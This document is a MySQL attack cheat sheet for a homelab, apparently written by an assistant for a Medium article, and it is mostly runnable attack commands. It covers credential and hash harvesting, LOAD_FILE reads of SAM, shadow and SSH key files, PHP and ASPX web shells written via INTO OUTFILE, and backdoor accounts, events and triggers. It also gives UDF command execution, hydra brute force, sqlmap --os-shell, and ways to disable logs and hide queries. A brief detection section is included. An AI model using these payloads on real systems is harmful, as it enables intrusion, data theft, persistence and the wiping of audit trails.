# MySQL Commands for Cybersecurity Homelab - The Shit That Actually Matters

## Pre-Engagement: Understanding Your Attack Surface

### Version & Capability Recon
```sql
-- MySQL version (important for exploit research)
SELECT VERSION();
SELECT @@version;

-- Check if running on Windows or Linux
SELECT @@version_compile_os;

-- Server capabilities
SHOW VARIABLES;

-- Specifically check security-relevant settings
SHOW VARIABLES LIKE '%ssl%';
SHOW VARIABLES LIKE '%file%';
SHOW VARIABLES LIKE '%secure%';
SHOW VARIABLES LIKE 'have_symlink';
SHOW VARIABLES LIKE 'plugin_dir';
```

---

## User Enumeration & Privilege Escalation

### Find High-Value Targets
```sql
-- All users and their access patterns
SELECT 
    user, 
    host, 
    plugin,
    password_expired,
    password_lifetime,
    account_locked
FROM mysql.user;

-- Users with remote access (the money shot)
SELECT user, host FROM mysql.user WHERE host != 'localhost';

-- Users with wildcard host access (your first targets)
SELECT user, host FROM mysql.user WHERE host = '%' OR host LIKE '%.%';

-- Root accounts (should only be localhost)
SELECT user, host FROM mysql.user WHERE user = 'root';

-- Empty password accounts (jackpot if they exist)
SELECT user, host FROM mysql.user WHERE authentication_string = '' OR authentication_string IS NULL;
```

### Privilege Mapping
```sql
-- Your current privileges
SHOW GRANTS;
SHOW GRANTS FOR CURRENT_USER();

-- Specific user privileges
SHOW GRANTS FOR 'svc-sql'@'%';
SHOW GRANTS FOR 'root'@'localhost';

-- Global privilege holders (these are your escalation targets)
SELECT 
    user, 
    host,
    Select_priv, Insert_priv, Update_priv, Delete_priv,
    Create_priv, Drop_priv, Grant_priv, Super_priv, File_priv
FROM mysql.user
WHERE 
    Select_priv = 'Y' AND 
    Insert_priv = 'Y' AND 
    Update_priv = 'Y' AND 
    Delete_priv = 'Y';

-- FILE privilege holders (filesystem access = game over)
SELECT user, host, File_priv FROM mysql.user WHERE File_priv = 'Y';

-- SUPER privilege holders (can kill connections, change settings)
SELECT user, host, Super_priv FROM mysql.user WHERE Super_priv = 'Y';

-- GRANT privilege holders (can create more admins)
SELECT user, host, Grant_priv FROM mysql.user WHERE Grant_priv = 'Y';

-- PROCESS privilege (can see all queries from all users)
SELECT user, host, Process_priv FROM mysql.user WHERE Process_priv = 'Y';

-- Detailed privilege breakdown by user
SELECT * FROM mysql.user WHERE user = 'svc-sql'\G
```

---

## Database Enumeration

### Information Gathering
```sql
-- List all databases
SHOW DATABASES;

-- Database sizes (find the valuable data)
SELECT 
    table_schema AS 'Database',
    ROUND(SUM(data_length + index_length) / 1024 / 1024, 2) AS 'Size (MB)'
FROM information_schema.tables
GROUP BY table_schema
ORDER BY SUM(data_length + index_length) DESC;

-- All tables across all databases
SELECT table_schema, table_name, table_type 
FROM information_schema.tables 
WHERE table_schema NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')
ORDER BY table_schema, table_name;

-- Find tables with specific keywords (user, password, credential, etc.)
SELECT table_schema, table_name
FROM information_schema.tables
WHERE table_name LIKE '%user%' 
   OR table_name LIKE '%password%'
   OR table_name LIKE '%credential%'
   OR table_name LIKE '%auth%'
   OR table_name LIKE '%login%'
   OR table_name LIKE '%account%';

-- Column enumeration (find where credentials are stored)
SELECT table_schema, table_name, column_name, data_type
FROM information_schema.columns
WHERE column_name LIKE '%password%'
   OR column_name LIKE '%pass%'
   OR column_name LIKE '%pwd%'
   OR column_name LIKE '%hash%'
   OR column_name LIKE '%token%'
   OR column_name LIKE '%secret%'
   OR column_name LIKE '%key%';

-- Table row counts (find the big datasets worth exfiltrating)
SELECT 
    table_schema,
    table_name,
    table_rows
FROM information_schema.tables
WHERE table_schema NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')
ORDER BY table_rows DESC;
```

### Schema Deep Dive
```sql
-- Switch to target database
USE database_name;

-- Show all tables
SHOW TABLES;

-- Table structure
DESCRIBE table_name;
SHOW CREATE TABLE table_name;

-- Indexes (useful for optimizing data exfiltration queries)
SHOW INDEXES FROM table_name;

-- Foreign key relationships (understand data model for complete extraction)
SELECT 
    TABLE_NAME,
    COLUMN_NAME,
    CONSTRAINT_NAME,
    REFERENCED_TABLE_NAME,
    REFERENCED_COLUMN_NAME
FROM information_schema.KEY_COLUMN_USAGE
WHERE TABLE_SCHEMA = 'database_name' 
  AND REFERENCED_TABLE_NAME IS NOT NULL;
```

---

## Data Exfiltration

### Targeted Data Extraction
```sql
-- Sample data from interesting tables
SELECT * FROM users LIMIT 10;
SELECT * FROM credentials LIMIT 10;
SELECT * FROM config LIMIT 10;

-- Count before extraction (know what you're getting)
SELECT COUNT(*) FROM users;

-- Extract specific columns (reduce noise)
SELECT username, email, password_hash FROM users;

-- Extract with conditions (find admins, active users, etc.)
SELECT * FROM users WHERE role = 'admin';
SELECT * FROM users WHERE is_active = 1;
SELECT * FROM users WHERE created_at > '2024-01-01';

-- Union-based extraction (combine multiple tables)
SELECT username, email FROM users
UNION
SELECT account_name, contact_email FROM accounts;

-- Extract with obfuscation (base64 encode for transport)
SELECT username, TO_BASE64(password_hash) FROM users;
```

### Bulk Data Dumping
```sql
-- Dump entire table (use for offline analysis)
SELECT * FROM users INTO OUTFILE 'C:\\temp\\users_dump.csv'
FIELDS TERMINATED BY ','
ENCLOSED BY '"'
LINES TERMINATED BY '\n';

-- Dump with headers
SELECT 'username', 'email', 'password_hash'
UNION ALL
SELECT username, email, password_hash FROM users
INTO OUTFILE 'C:\\temp\\users_with_headers.csv'
FIELDS TERMINATED BY ','
ENCLOSED BY '"';

-- Alternative: Client-side dump (no FILE privilege needed)
# From KALI:
mysql -h 192.168.56.4 -u root -pMySQL123! -e "SELECT * FROM app_database.users;" > users_dump.txt
```

---

## Credential Harvesting

### Password Hash Extraction
```sql
-- MySQL user password hashes
SELECT user, host, authentication_string, plugin 
FROM mysql.user 
WHERE authentication_string != '';

-- Export hashes for offline cracking
SELECT CONCAT(user, ':', authentication_string) 
FROM mysql.user 
WHERE authentication_string != ''
INTO OUTFILE 'C:\\temp\\mysql_hashes.txt';

-- Application password hashes
SELECT username, password, password_hash, email 
FROM users 
WHERE password IS NOT NULL OR password_hash IS NOT NULL;

-- Find password reset tokens (often reusable)
SELECT user_id, token, expires_at, created_at 
FROM password_resets 
WHERE expires_at > NOW();

-- Session tokens (hijack active sessions)
SELECT user_id, session_token, ip_address, user_agent, created_at
FROM sessions
WHERE expires_at > NOW();

-- API keys/tokens
SELECT api_key, user_id, permissions, created_at
FROM api_keys
WHERE is_active = 1;
```

### Configuration & Secrets
```sql
-- Application config tables (often have credentials)
SELECT * FROM config;
SELECT * FROM settings;
SELECT * FROM app_config;

-- Find connection strings in config
SELECT * FROM config WHERE key LIKE '%connection%' OR key LIKE '%database%' OR key LIKE '%server%';

-- Environment variables stored in DB
SELECT * FROM environment WHERE name LIKE '%KEY%' OR name LIKE '%SECRET%' OR name LIKE '%PASSWORD%';
```

---

## Filesystem Operations (FILE Privilege Required)

### Read Files
```sql
-- Read web.config (database credentials)
SELECT LOAD_FILE('C:\\inetpub\\wwwroot\\web.config');

-- Read PHP config files
SELECT LOAD_FILE('C:\\inetpub\\wwwroot\\config.php');
SELECT LOAD_FILE('C:\\inetpub\\wwwroot\\wp-config.php');  -- WordPress

-- Read batch/script files
SELECT LOAD_FILE('C:\\inetpub\\wwwroot\\backup.bat');
SELECT LOAD_FILE('C:\\Scripts\\deploy.bat');

-- Read Windows password files (if MySQL runs as SYSTEM - unlikely but check)
SELECT LOAD_FILE('C:\\Windows\\System32\\config\\SAM');
SELECT LOAD_FILE('C:\\Windows\\System32\\config\\SYSTEM');

-- Read SSH keys (Linux targets)
SELECT LOAD_FILE('/root/.ssh/id_rsa');
SELECT LOAD_FILE('/home/user/.ssh/id_rsa');

-- Read /etc/passwd (Linux user enumeration)
SELECT LOAD_FILE('/etc/passwd');

-- Read shadow file (Linux password hashes - requires root MySQL)
SELECT LOAD_FILE('/etc/shadow');

-- Read application logs (often contain credentials)
SELECT LOAD_FILE('C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex241204.log');

-- Check if file exists (LOAD_FILE returns NULL if file doesn't exist)
SELECT IF(LOAD_FILE('C:\\inetpub\\wwwroot\\web.config') IS NOT NULL, 'File exists', 'File not found');
```

### Write Files (Web Shell Creation)
```sql
-- PHP web shell (simple command execution)
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE 'C:\\inetpub\\wwwroot\\shell.php';

-- Test: http://192.168.56.4/shell.php?cmd=whoami

-- More sophisticated PHP shell
SELECT '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>'
INTO OUTFILE 'C:\\inetpub\\wwwroot\\cmd.php';

-- ASP.NET web shell (if IIS is running ASP.NET)
SELECT '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%String cmd = Request["cmd"];Process p = new Process();p.StartInfo.FileName = "cmd.exe";p.StartInfo.Arguments = "/c " + cmd;p.StartInfo.UseShellExecute = false;p.StartInfo.RedirectStandardOutput = true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());p.WaitForExit();%>'
INTO OUTFILE 'C:\\inetpub\\wwwroot\\shell.aspx';

-- Upload backdoor to startup (persistence)
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.php';

-- Write to writable web directories (trial and error)
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\uploads\\shell.php';
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\images\\shell.php';
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\files\\shell.php';

-- Write SSH public key for access (Linux)
SELECT 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...[your public key]...' 
INTO OUTFILE '/root/.ssh/authorized_keys';
```

### File System Recon
```sql
-- Check secure_file_priv setting (where you can read/write)
SELECT @@secure_file_priv;
-- Empty string = anywhere (your config)
-- NULL = disabled
-- Path = restricted to that directory

-- Check datadir (where database files are stored)
SELECT @@datadir;

-- Check plugin directory
SELECT @@plugin_dir;

-- Check tmpdir
SELECT @@tmpdir;

-- Test write permissions
SELECT 'test' INTO OUTFILE 'C:\\temp\\test.txt';
-- If successful, you have write access
-- If error, try different paths
```

---

## Persistence & Backdoors

### Create Backdoor Accounts
```sql
-- Create backdoor user with full privileges
CREATE USER 'backdoor'@'%' IDENTIFIED BY 'Persistent123!';
GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

-- Create low-profile backdoor (blend in with service accounts)
CREATE USER 'svc_backup'@'%' IDENTIFIED BY 'BackupSvc2024!';
GRANT SELECT, FILE ON *.* TO 'svc_backup'@'%';
FLUSH PRIVILEGES;

-- Create backdoor in specific database (less obvious)
CREATE USER 'app_readonly'@'%' IDENTIFIED BY 'ReadOnly123!';
GRANT SELECT ON app_database.* TO 'app_readonly'@'%';
-- But also give global privileges via mysql database manipulation
UPDATE mysql.user SET Select_priv='Y', File_priv='Y' WHERE user='app_readonly';
FLUSH PRIVILEGES;
```

### Scheduled Tasks via Events (MySQL 5.1+)
```sql
-- Check if event scheduler is enabled
SHOW VARIABLES LIKE 'event_scheduler';

-- Enable event scheduler
SET GLOBAL event_scheduler = ON;

-- Create recurring backdoor (creates new admin user every hour)
CREATE EVENT IF NOT EXISTS backdoor_persistence
ON SCHEDULE EVERY 1 HOUR
DO
    CREATE USER IF NOT EXISTS 'ghost'@'%' IDENTIFIED BY 'Ghost2024!';
    GRANT ALL PRIVILEGES ON *.* TO 'ghost'@'%';
    FLUSH PRIVILEGES;

-- Create event that dumps data periodically
CREATE EVENT exfil_data
ON SCHEDULE EVERY 1 DAY
DO
    SELECT * FROM users INTO OUTFILE '/tmp/daily_dump.csv';

-- List all events
SHOW EVENTS;
SELECT * FROM information_schema.events;

-- Delete event (cleanup)
DROP EVENT IF EXISTS backdoor_persistence;
```

### Trigger-Based Persistence
```sql
-- Create trigger that logs credentials on login attempts
CREATE TRIGGER capture_login
AFTER INSERT ON login_attempts
FOR EACH ROW
    INSERT INTO exfil_table (username, password, timestamp)
    VALUES (NEW.username, NEW.password, NOW());

-- Create trigger that creates backdoor on specific action
CREATE TRIGGER backdoor_trigger
AFTER UPDATE ON users
FOR EACH ROW
BEGIN
    IF NEW.role = 'admin' THEN
        CREATE USER IF NOT EXISTS 'shadow'@'%' IDENTIFIED BY 'Shadow123!';
        GRANT ALL PRIVILEGES ON *.* TO 'shadow'@'%';
    END IF;
END;

-- List triggers
SHOW TRIGGERS;
SELECT * FROM information_schema.triggers;
```

---

## User-Defined Functions (UDF) - Advanced Privilege Escalation

### Check UDF Capability
```sql
-- Check plugin directory (where UDF libraries go)
SELECT @@plugin_dir;

-- List existing functions
SELECT * FROM mysql.func;

-- Check if we can create functions
SHOW GRANTS;
-- Need CREATE ROUTINE privilege
```

### Create UDF for Command Execution (Advanced)
```sql
-- This requires compiling a malicious .so (Linux) or .dll (Windows) first
-- Then uploading it to plugin_dir via SELECT ... INTO DUMPFILE

-- Example: lib_mysqludf_sys provides sys_exec and sys_eval functions
-- After uploading lib_mysqludf_sys.dll to plugin directory:

CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.dll';
CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.dll';

-- Execute commands
SELECT sys_exec('net user hacker Password123! /add');
SELECT sys_exec('net localgroup administrators hacker /add');

-- Evaluate commands and return output
SELECT sys_eval('whoami');
SELECT sys_eval('ipconfig');

-- This is nuclear-level access - command execution as MySQL service account
```

**Reality check**: UDF exploitation requires FILE privilege to write to plugin_dir, which usually has strict permissions. This works in older MySQL versions or misconfigured servers. Your homelab might have the right conditions if MySQL runs as SYSTEM and plugin_dir is writable.

---

## Network & Connection Analysis

### Active Connections
```sql
-- See who's connected right now
SHOW PROCESSLIST;

-- Full processlist (not truncated)
SHOW FULL PROCESSLIST;

-- Detailed connection info
SELECT * FROM information_schema.processlist;

-- Count connections per user
SELECT user, COUNT(*) as connection_count
FROM information_schema.processlist
GROUP BY user
ORDER BY connection_count DESC;

-- Find long-running queries (potential data exfiltration)
SELECT id, user, host, db, command, time, state, info
FROM information_schema.processlist
WHERE command != 'Sleep' AND time > 10
ORDER BY time DESC;

-- Find suspicious queries
SELECT id, user, host, db, time, info
FROM information_schema.processlist
WHERE info LIKE '%LOAD_FILE%'
   OR info LIKE '%INTO OUTFILE%'
   OR info LIKE '%CREATE USER%'
   OR info LIKE '%GRANT%'
   OR info LIKE '%password%';
```

### Connection History (Performance Schema)
```sql
-- Check if performance_schema is enabled
SHOW VARIABLES LIKE 'performance_schema';

-- Recent connections
SELECT * FROM performance_schema.accounts;

-- Connection attempts by host
SELECT * FROM performance_schema.host_cache;

-- Failed connection attempts
SELECT * FROM performance_schema.host_cache
WHERE SUM_CONNECT_ERRORS > 0;

-- Detailed session info
SELECT * FROM performance_schema.session_connect_attrs;
```

---

## Covering Tracks

### Log Manipulation
```sql
-- Check if general log is enabled
SHOW VARIABLES LIKE 'general_log%';

-- Check if slow query log is enabled
SHOW VARIABLES LIKE 'slow_query_log%';

-- Disable logging (if you have SUPER privilege)
SET GLOBAL general_log = 'OFF';
SET GLOBAL slow_query_log = 'OFF';

-- Re-enable after activity (restore original state)
SET GLOBAL general_log = 'ON';
SET GLOBAL slow_query_log = 'ON';
```

### Clear Evidence
```sql
-- Delete backdoor queries from processlist (kill your own connection later)
-- First, find your connection ID
SELECT CONNECTION_ID();

-- Kill specific connection (removes from processlist)
KILL <connection_id>;

-- Clear binary logs (if you have SUPER privilege)
RESET MASTER;
-- WARNING: This breaks replication if configured

-- Purge old binary logs
PURGE BINARY LOGS BEFORE '2024-12-01 00:00:00';

-- Clear error log (requires filesystem access)
-- Via LOAD_FILE/INTO OUTFILE or direct filesystem access
```

### Remove Backdoor Accounts
```sql
-- List all your backdoor accounts
SELECT user, host FROM mysql.user 
WHERE user IN ('backdoor', 'shadow', 'ghost', 'svc_backup', 'hacker');

-- Delete backdoor users
DROP USER 'backdoor'@'%';
DROP USER 'shadow'@'%';
DROP USER 'ghost'@'%';

-- Remove events
DROP EVENT IF EXISTS backdoor_persistence;
DROP EVENT IF EXISTS exfil_data;

-- Remove triggers
DROP TRIGGER IF EXISTS capture_login;
DROP TRIGGER IF EXISTS backdoor_trigger;

-- Verify cleanup
SELECT user, host FROM mysql.user WHERE user NOT IN ('root', 'mysql.sys', 'mysql.session', 'svc-sql');
SHOW EVENTS;
SHOW TRIGGERS;
```

---

## Post-Exploitation Reconnaissance

### System Information via SQL
```sql
-- MySQL version and OS
SELECT @@version, @@version_compile_os, @@version_compile_machine;

-- Hostname
SELECT @@hostname;

-- Data directory (where databases are physically stored)
SELECT @@datadir;

-- Base directory (MySQL installation)
SELECT @@basedir;

-- Check if running as root/SYSTEM (dangerous for MySQL but useful for attacker)
SELECT USER(), CURRENT_USER(), @@version;

-- System time (useful for timestamp correlation)
SELECT NOW(), UTC_TIMESTAMP();

-- Character sets (for encoding attacks)
SELECT * FROM information_schema.character_sets;

-- Time zone
SELECT @@global.time_zone, @@session.time_zone;
```

### Enumerate Server Configuration
```sql
-- All server variables (huge output, but comprehensive)
SHOW VARIABLES;

-- Save variables for offline analysis
SELECT variable_name, variable_value 
FROM information_schema.global_variables
INTO OUTFILE 'C:\\temp\\mysql_config.csv';

-- Security-relevant settings
SELECT variable_name, variable_value 
FROM information_schema.global_variables
WHERE variable_name IN (
    'secure_file_priv',
    'local_infile',
    'require_secure_transport',
    'bind_address',
    'port',
    'have_ssl',
    'general_log',
    'log_error',
    'datadir',
    'plugin_dir'
);
```

---

## Attack Automation & Scripting

### Batch User Creation
```sql
-- Create multiple backdoor accounts quickly
DELIMITER //
CREATE PROCEDURE create_backdoors()
BEGIN
    DECLARE i INT DEFAULT 1;
    WHILE i <= 5 DO
        SET @sql = CONCAT('CREATE USER IF NOT EXISTS "user', i, '"@"%" IDENTIFIED BY "Pass', i, '123!"');
        PREPARE stmt FROM @sql;
        EXECUTE stmt;
        DEALLOCATE PREPARE stmt;
        
        SET @grant = CONCAT('GRANT ALL PRIVILEGES ON *.* TO "user', i, '"@"%" WITH GRANT OPTION');
        PREPARE stmt2 FROM @grant;
        EXECUTE stmt2;
        DEALLOCATE PREPARE stmt2;
        
        SET i = i + 1;
    END WHILE;
    FLUSH PRIVILEGES;
END//
DELIMITER ;

-- Execute
CALL create_backdoors();

-- Cleanup procedure after execution
DROP PROCEDURE IF EXISTS create_backdoors;
```

### Automated Data Exfiltration
```sql
-- Create procedure to dump all tables in a database
DELIMITER //
CREATE PROCEDURE exfil_database(IN db_name VARCHAR(64))
BEGIN
    DECLARE done INT DEFAULT FALSE;
    DECLARE tbl VARCHAR(64);
    DECLARE cur CURSOR FOR 
        SELECT table_name FROM information_schema.tables 
        WHERE table_schema = db_name;
    DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;
    
    OPEN cur;
    read_loop: LOOP
        FETCH cur INTO tbl;
        IF done THEN
            LEAVE read_loop;
        END IF;
        
        SET @sql = CONCAT('SELECT * FROM ', db_name, '.', tbl, ' INTO OUTFILE "C:\\\\temp\\\\', tbl, '_dump.csv"');
        PREPARE stmt FROM @sql;
        EXECUTE stmt;
        DEALLOCATE PREPARE stmt;
    END LOOP;
    CLOSE cur;
END//
DELIMITER ;

-- Execute
CALL exfil_database('app_database');
```

---

## KALI Attack Commands (External Perspective)

### Initial Access
```bash
# Nmap MySQL enumeration
nmap -p 3306 --script mysql-info,mysql-enum,mysql-databases,mysql-variables,mysql-audit 192.168.56.4

# MySQL brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://192.168.56.4 -t 4
medusa -h 192.168.56.4 -u root -P /usr/share/wordlists/mysql.txt -M mysql -n 3306

# Metasploit MySQL scanner
msfconsole -q -x "use auxiliary/scanner/mysql/mysql_login; set RHOSTS 192.168.56.4; set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt; set PASS_FILE /usr/share/wordlists/mysql.txt; run; exit"
```

### Post-Exploitation from KALI
```bash
# Quick database enumeration
mysql -h 192.168.56.4 -u root -pMySQL123! -e "SHOW DATABASES;"

# Dump all databases
mysqldump -h 192.168.56.4 -u root -pMySQL123! --all-databases > complete_dump.sql

# Dump specific database
mysqldump -h 192.168.56.4 -u root -pMySQL123! app_database > app_dump.sql

# Dump only table structure (no data)
mysqldump -h 192.168.56.4 -u root -pMySQL123! --no-data app_database > schema.sql

# Execute SQL file
mysql -h 192.168.56.4 -u root -pMySQL123! < commands.sql

# Interactive execution
mysql -h 192.168.56.4 -u root -pMySQL123! -e "SELECT user, host FROM mysql.user;"

# Batch command execution
echo "SHOW DATABASES; SELECT user, host FROM mysql.user;" | mysql -h 192.168.56.4 -u root -pMySQL123!

# Extract password hashes for cracking
mysql -h 192.168.56.4 -u root -pMySQL123! -e "SELECT CONCAT(user, ':', authentication_string) FROM mysql.user WHERE authentication_string != ''" | tail -n +2 > hashes.txt

# Create backdoor user
mysql -h 192.168.56.4 -u root -pMySQL123! -e "CREATE USER 'backdoor'@'%' IDENTIFIED BY 'Persistent123!'; GRANT ALL PRIVILEGES ON *.* TO 'backdoor'@'%' WITH GRANT OPTION; FLUSH PRIVILEGES;"

# Write web shell via MySQL
mysql -h 192.168.56.4 -u root -pMySQL123! -e "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE 'C:\\\\inetpub\\\\wwwroot\\\\mysql_shell.php';"

# Verify web shell creation
curl http://192.168.56.4/mysql_shell.php?cmd=whoami
```

### Hash Cracking
```bash
# John the Ripper (mysql-sha1 format for mysql_native_password)
john --format=mysql-sha1 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Show cracked passwords
john --show --format=mysql-sha1 hashes.txt

# Hashcat (faster, GPU-accelerated)
# Mode 300 = MySQL 4.1+
hashcat -m 300 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Generate hash from known password (for testing)
echo -n 'MySQL123!' | sha1sum | xxd -r -p | sha1sum
```

---

## Defense Evasion Techniques

### Obfuscated Queries
```sql
-- Use comments to break up keywords
SEL/*comment*/ECT * FROM users;
SELECT/**/user,host/**/FROM/**/mysql.user;

-- Case variation (MySQL is case-insensitive for keywords)
SeLeCt * FrOm UsErS;

-- Hex encoding
SELECT 0x73656c656374202a2066726f6d2075736572733b;
-- Decodes to: select * from users;

-- Char() function for string obfuscation
SELECT CHAR(115,101,108,101,99,116,32,42,32,102,114,111,109,32,117,115,101,114,115);
```

### Timing-Based Detection Evasion
```sql
-- Add random delays between queries (evade rate-based detection)
SELECT SLEEP(RAND()*10);

-- Slow data exfiltration (under the radar)
SELECT * FROM users WHERE id = 1; SELECT SLEEP(5);
SELECT * FROM users WHERE id = 2; SELECT SLEEP(5);
-- etc.
```

---

## Blue Team: Detection Queries

### Find Suspicious Activity
```sql
-- Recently created users
SELECT user, host, password_last_changed 
FROM mysql.user 
WHERE password_last_changed > DATE_SUB(NOW(), INTERVAL 7 DAY);

-- Users with recent privilege changes
SELECT * FROM mysql.tables_priv 
WHERE timestamp > DATE_SUB(NOW(), INTERVAL 7 DAY);

-- Check for wildcard host users (red flag)
SELECT user, host FROM mysql.user WHERE host = '%';

-- Find users with FILE privilege
SELECT user, host FROM mysql.user WHERE File_priv = 'Y';

-- Recently modified tables
SELECT table_schema, table_name, update_time
FROM information_schema.tables
WHERE update_time IS NOT NULL
ORDER BY update_time DESC
LIMIT 20;

-- Suspicious stored procedures/functions
SELECT routine_schema, routine_name, routine_type, created, last_altered
FROM information_schema.routines
WHERE routine_schema NOT IN ('sys', 'mysql');

-- Check for triggers (often used for persistence)
SELECT trigger_schema, trigger_name, event_object_table, action_statement
FROM information_schema.triggers;

-- Check for scheduled events
SELECT event_schema, event_name, status, on_completion, created, last_altered
FROM information_schema.events;
```

---

## Quick Reference: Attack Paths

### Path 1: Config File → Credentials → Database Dump
```bash
# 1. Find exposed config
curl http://192.168.56.4/web.config

# 2. Extract credentials
# svc-sql:SqlPassword123!

# 3. Connect & dump
mysql -h 192.168.56.4 -u svc-sql -pSqlPassword123! -e "SHOW DATABASES;"
mysqldump -h 192.168.56.4 -u svc-sql -pSqlPassword123! --all-databases > dump.sql
```

### Path 2: Brute Force → Hash Extraction → Offline Cracking
```bash
# 1. Brute force
hydra -l root -P mysql.txt mysql://192.168.56.4

# 2. Extract hashes
mysql -h 192.168.56.4 -u root -pMySQL123! -e "SELECT CONCAT(user,':',authentication_string) FROM mysql.user;" > hashes.txt

# 3. Crack offline
john --format=mysql-sha1 --wordlist=rockyou.txt hashes.txt
```

### Path 3: Database Access → Web Shell → System Compromise
```bash
# 1. Connect to MySQL
mysql -h 192.168.56.4 -u root -pMySQL123!

# 2. Write web shell
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'C:\\inetpub\\wwwroot\\s.php';

# 3. Execute commands
curl "http://192.168.56.4/s.php?cmd=whoami"
curl "http://192.168.56.4/s.php?cmd=net user hacker Pass123! /add"
curl "http://192.168.56.4/s.php?cmd=net localgroup administrators hacker /add"
```

### Path 4: SQL Injection → Database Access → Privilege Escalation
```bash
# 1. Find SQL injection
sqlmap -u "http://192.168.56.4/page.php?id=1" --dbs

# 2. Enumerate databases
sqlmap -u "http://192.168.56.4/page.php?id=1" -D app_database --tables

# 3. Dump data
sqlmap -u "http://192.168.56.4/page.php?id=1" -D app_database -T users --dump

# 4. Get OS shell via SQLMap
sqlmap -u "http://192.168.56.4/page.php?id=1" --os-shell
```

---

## Notes for Your Medium Article

**Structure this as**:
1. **Reconnaissance** (version, users, privileges, databases)
2. **Initial Access** (brute force, config files, SQL injection)
3. **Privilege Escalation** (FILE privilege, UDFs, backdoor users)
4. **Persistence** (backdoor accounts, events, triggers)
5. **Data Exfiltration** (dumps, LOAD_FILE, INTO OUTFILE)
6. **Lateral Movement** (web shells, credential reuse)
7. **Covering Tracks** (log manipulation, cleanup)

**Key Insights to Emphasize**:
- MySQL security is **user@host** authentication - host matters as much as username
- FILE privilege = filesystem access = web shells = game over
- Service accounts with DBA privileges are your escalation path
- `bind-address=0.0.0.0` + weak passwords = internet-facing database compromise
- Credentials in config files + remote MySQL access = complete database dump
- The chain: database → filesystem → web shell → system compromise

**Detection Opportunities**:
- Remote connections from non-application IPs
- FILE operations (LOAD_FILE, INTO OUTFILE) in query logs
- User creation, GRANT operations
- Unusual query patterns (large SELECTs, schema enumeration)
- New scheduled events or triggers

Make it clear you're not just running Metasploit modules - you understand the MySQL privilege model, the attack surface each misconfiguration creates, and how to chain database access into complete system compromise. That's what separates "I got a shell" from "I understand MySQL security architecture."

Now go test every single one of these commands on APP01 and document what works, what fails, and why. That hands-on documentation is your portfolio differentiator.